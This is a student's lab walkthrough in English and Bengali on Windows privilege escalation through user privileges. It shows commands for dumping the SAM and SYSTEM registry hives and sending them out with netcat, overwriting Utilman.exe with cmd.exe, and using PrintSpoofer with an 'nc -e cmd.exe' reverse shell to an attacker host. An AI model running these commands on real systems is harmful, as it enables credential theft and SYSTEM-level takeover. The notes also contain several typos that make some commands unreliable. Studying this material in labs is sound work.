# **WIndows Privilege Escalation via User Privileges**

ROOM: windows privilege escalation [task 6]

cmd run as administrator to show all the privilege
```
whoami /priv 
```
* It shows all the privilege of the user

* output: 

```
    privilege name          description            state   
* SeBackUpPrivilege           .....               Disabled
* SeRestorePrivilege          .....               Disabled
SeShutdownPrivilege           .....               Disabled
------------
------------
```

## SeBackUpPrivilege

==> If a user have this privilege, then he can read any file of the system. Now privilege escalate using this vector by SAM & SYSTEM file

```
cd C:\Users\thmbackup\
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
```

==> Now transfer these two file in kali & privilege escalate by previous method [credential discovery]

==> Now learn abount another transfer method: using netcat

step_1: download netcat.exe in kali "github.com/int0x33/nc.exe/bolb/master/nc64.exe" & then transfer to windows by powershell 

```
kali: mv nc64.exe nc.exe
kali: python3 -m http.server 80

power: Invoke_WebRequest -uri http://kali_tun0_ip/nc.exe -OutFile nc.exe
power: .\nc.exe -h
```

* Now transfer the data from windows to kali using nc 

```
cmd:  nc kali_ip 4444 < SAM                     kali: nc -nvlp 4444 > SAM
cmd:  nc kali_ip 4444 < SYSTEM                  kali: nc -nvlp 4444 > SYSTEM
```




## SeRestorePrivilege 

==> If a user have this  privilege , then he can write any file of the system. Now change the ImagePath in the reg & start the process & get reverse shell as previous technique via misconfigured services



**"" Now login as another user thmtakeownership who have SeTakeOwnershipPrivillege ""**


## SeTakeOwnershipPrivillege

==> he can change all the files ownership. Now he can change the file owner and make himself owner & then get the permission for read,write,overwrite the file. Now privilege escalate by Utilman.exe 

==> Utilman.exe (Utility Manager) হলো Windows-এর একটি system program, যা Ease of Access tools (accessibility features) চালানোর জন্য ব্যবহৃত হয়।
📂 Location: C:\Windows\System32\utilman.exe

⚙️ কী কাজ করে:
* Login screen থেকেও access করা যায়
* Accessibility tools চালায়, যেমন:
* * Narrator
* * Magnifier
* * On-Screen Keyboard

👉 Shortcut:Windows + U

⚠️ Security Perspective:
* Login screen-এ run হয় → SYSTEM privilege থাকে
* যদি replace করা যায় (e.g., cmd.exe দিয়ে), তাহলে Login screen থেকেই command prompt open করা যায়

💥 Attack Concept:

👉 utilman.exe replace → cmd.exe
👉 Login screen-এ Ease of Access চাপলে → cmd খুলবে
👉 SYSTEM privilege পাওয়া সম্ভব


* Make owner of thmtakeownership 

```
icacls C:\Windows\System32\Utilman.exe /grant thmtakeownership:F
```
* overwrite cmd.exe --> Utilman.exe

```
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```


## SeAssignPrimaryTokenPrivilege & SeImpersonatePrivilege

🔹 SeAssignPrimaryTokenPrivilege

👉 এই privilege থাকলে একটি process অন্য user-এর token assign করতে পারে (primary token change করা যায়)

⚙️ কী কাজ করে:
* নতুন process চালানোর সময় অন্য user-এর identity ব্যবহার করা
* সাধারণত service বা system-level process-এ থাকে
⚠️ Security:
* attacker এই privilege ব্যবহার করে উচ্চ privilege user-এর token দিয়ে process চালাতে পারে
* Privilege Escalation সম্ভব

🔹 SeImpersonatePrivilege

👉 এই privilege থাকলে একটি process অন্য user হিসেবে temporarily act (impersonate) করতে পারে

⚙️ কী কাজ করে:
* client request handle করার সময় user-এর identity ব্যবহার করা
* service account-এ সাধারণত থাকে
⚠️ Security:
* attacker এই privilege exploit করে (e.g., token impersonation attack)
* SYSTEM বা admin access পাওয়া সম্ভব

🔗 পার্থক্য (Short):
| বিষয়    | SeAssignPrimaryTokenPrivilege     | SeImpersonatePrivilege             |
| ------- | --------------------------------- | ---------------------------------- |
| কাজ     | অন্য user-এর primary token assign | অন্য user হিসেবে act (impersonate) |
| ব্যবহার | process create/change             | request handle / temporary use     |
| ঝুঁকি   | privilege escalation              | privilege escalation (common)      |

==> For solve this problem we have to browse http:/thm_ip

```
whoami /priv                   [kali: python3 -m http.server 80 {kali}]
curl http://kali_ip/nc.exe -o C:\Users\Public\nc.exe
curl http://kali_ip/nc.exe -o C:\Users\Public\ps.exe
C:\Users\Public\ps.exe -c "C:\Users\Public\nc.exe -e cmd.exe kali_ip 4445"
nc -nvlp 4445    [kali]
```

==> Get reverse shell of nt-authority user.

==> PrintSpoofer64.exe[ps.exe] একটি tool, যা Windows-এর SeImpersonatePrivilege exploit করে SYSTEM privilege পাওয়ার জন্য ব্যবহার করা হয়।

⚙️ মূল ধারণা (Core Idea)

👉 Windows-এর Print Spooler service ব্যবহার করে
👉 attacker নিজের process-কে SYSTEM user হিসেবে impersonate করায়


🔄 কীভাবে কাজ করে (Flow)
1. Attacker-এর কাছে আগে থেকেই SeImpersonatePrivilege থাকতে হবে
2. PrintSpoofer একটি named pipe তৈরি করে
3. Print Spooler service-কে trick করে ওই pipe-এ connect করায়
4. যখন SYSTEM process connect করে → attacker সেই token capture করে
5. এরপর সেই token দিয়ে নতুন process run করে

👉 Result:
SYSTEM privilege shell পাওয়া যায়

💡 সহজভাবে:
👉 “SYSTEM process কে trick করে → তার identity copy করা”

⚠️ কেন কাজ করে?
* Windows service (Print Spooler) high privilege (SYSTEM) দিয়ে চলে
* SeImpersonatePrivilege থাকলে সেই identity steal করা যায়


🚨 Security Impact:
* Local Privilege Escalation
* Admin → SYSTEM access
* Full system compromise

